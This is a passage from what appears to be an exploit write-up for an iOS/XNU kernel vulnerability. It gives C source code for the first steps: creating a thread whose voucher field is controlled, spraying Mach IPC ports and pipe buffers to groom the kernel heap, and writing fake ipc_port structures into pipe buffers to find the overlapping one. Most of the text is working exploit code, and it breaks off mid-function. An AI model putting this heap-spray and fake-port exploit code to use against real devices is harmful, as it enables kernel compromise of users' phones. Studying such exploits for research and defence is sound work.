&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;c1&quot;&gt;// 1\. Create the thread whose ith_voucher field we will use during the exploit. This could&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// be the current thread, but that causes a panic if we try to perform logging while not&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// being run under a debugger, since write() will trigger an access to ith_voucher. To&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// avoid this, we create a separate thread whose ith_voucher field we can control. In order&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// for thread_set_mach_voucher() to work, we need to be sure not to start the thread.&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;thread_create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_task_self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;step-2-create-pipes-for-the-spray&quot;&gt;Step 2: Create Pipes for the spray&lt;/h4&gt;

&lt;p&gt;Generate pipes for the spray. These pipes will be sprayed after the ports spray so they can land in adjacent memory. The maximum size allowed for a pipe buffer is &lt;strong&gt;16384&lt;/strong&gt; bytes and the total size for all the pipe buffers is &lt;strong&gt;16MB&lt;/strong&gt;. Therefore the total number of pipes that can be sprayed is &lt;strong&gt;1024&lt;/strong&gt;. During the overlap, one of the pipes and its corresponding pipe buffer will overlap with the fake port.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;c1&quot;&gt;// 2\. Create some pipes so that we can spray pipe buffers later. We'll be limited to 16 MB&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// of pipe memory, so don't bother creating more.&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;pipe_buffer_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16384&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MB&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe_buffer_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;increase_file_limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pipefds_array&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;create_pipes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pipe_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;INFO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;created %zu pipes&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;step-3-spray-the-heap-with-ports&quot;&gt;Step 3: Spray the Heap with Ports&lt;/h4&gt;

&lt;p&gt;We need to spray a lot of IPC ports. Some of these ports will close the existing holes and force the kernel to allocate additional blocks from the zone map. When we spray the pipe buffers after that, we will assume that they land just in front of the ports. The &lt;strong&gt;filler_port_count&lt;/strong&gt; is chosen to be &lt;strong&gt;8000&lt;/strong&gt; based on trial and error. The &lt;strong&gt;base_port&lt;/strong&gt; is the last port created using the &lt;strong&gt;create_ports&lt;/strong&gt; call. Remember this as we will use it again in Step 8. The next memory block should be hopefully allocated next to the pipe buffers, and since the pipe size is &lt;strong&gt;16MB&lt;/strong&gt;, our fake port which we will create inside the pipe buffer should be within the &lt;strong&gt;16MB&lt;/strong&gt; range. On the first &lt;strong&gt;2000 ports&lt;/strong&gt;, we also increase the queue limit, which is the maximum of messages that can be sent at once to the port. The reason for doing is on the first &lt;strong&gt;2000&lt;/strong&gt; ports is because we will be sending messages using OOL ports descriptor to these ports in order to reallocate the freed vouchers, and hence having the ability to send more messages to these ports would help in the spray.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;c1&quot;&gt;// 3\. Spray a bunch of IPC ports. Hopefully these ports force the ipc.ports zone to grow&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// and allocate fresh pages from the zone map, so that the pipe buffers we allocate next&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// are placed directly after the ports.&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// We want to do this as early as possible so that the ports are given low addresses in the&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// zone map, which increases the likelihood that bits 28-31 of the pointer are 0 (which is&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// necessary later so that the overlapping iv_refs field of the voucher is valid).&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filler_port_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base_port_to_fake_port_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filler_ports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;create_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filler_port_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;INFO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;created %zu ports&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filler_port_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Grab the base port.&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;base_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filler_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filler_port_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Bump the queue limit on the first 2000 ports, which will also be used as holding ports.&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;port_increase_queue_limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filler_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
    	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;step-4-spray-the-pipe-buffers&quot;&gt;Step 4: Spray the Pipe buffers&lt;/h4&gt;

&lt;p&gt;Next, we spray the heap with pipe buffers and hope they land just after the ports in memory.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;c1&quot;&gt;// 4\. Spray our pipe buffers. We're hoping that these land contiguously right after the&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// ports.&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pipe_buffer_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16384&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;pipe_buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;calloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe_buffer_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pipe_buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pipe_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IO_BITS_KOTYPE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipes_sprayed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe_spray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pipefds_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    			&lt;span class=&quot;n&quot;&gt;pipe_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe_buffer_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    			&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe_index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;c1&quot;&gt;// For each pipe buffer we're going to spray, initialize the possible ipc_ports&lt;/span&gt;
    		&lt;span class=&quot;c1&quot;&gt;// so that the IKOT_TYPE tells us which pipe index overlaps. We have 1024 pipes and&lt;/span&gt;
    		&lt;span class=&quot;c1&quot;&gt;// 12 bits of IKOT_TYPE data, so the pipe index should fit just fine.&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;iterate_ipc_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    			&lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    			&lt;span class=&quot;n&quot;&gt;FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_bits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;       &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;io_makebits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IOT_PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe_index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    			&lt;span class=&quot;n&quot;&gt;FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_references&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    			&lt;span class=&quot;n&quot;&gt;FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_mscount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    			&lt;span class=&quot;n&quot;&gt;FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_srights&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    		&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
    	&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sprayed_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipes_sprayed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe_buffer_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;INFO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sprayed %zu bytes to %zu pipes in kalloc.%zu&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    			&lt;span class=&quot;n&quot;&gt;sprayed_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipes_sprayed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe_buffer_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Also, for each pipe buffer, we are going to write the pipe buffer with possible &lt;strong&gt;ipc_port&lt;/strong&gt; structs and change the 12 bits of &lt;strong&gt;IKOT_TYPE&lt;/strong&gt; for the port to the pipe index. This will help us in finding the overalapping pipe amongst all the pipes, since the data in the pipe buffer will be interpreted as a fake port. This is done by the callback function &lt;strong&gt;update&lt;/strong&gt; which in turn calls &lt;strong&gt;iterate_ipc_ports&lt;/strong&gt; and sets the attributes for the &lt;strong&gt;ipc_port&lt;/strong&gt;. This data is then written to the write end of the buffer.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;pipe_spray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pipefds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    		&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pipe_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe_buffer_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    		&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe_index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pipe_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pipe_buffer_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;512&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;write_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe_buffer_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipes_filled&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;c1&quot;&gt;// Update the buffer.&lt;/span&gt;
    		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    			&lt;span class=&quot;n&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe_buffer_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    		&lt;span class=&quot;c1&quot;&gt;// Fill the write-end of the pipe with the buffer. Leave off the last byte.&lt;/span&gt;
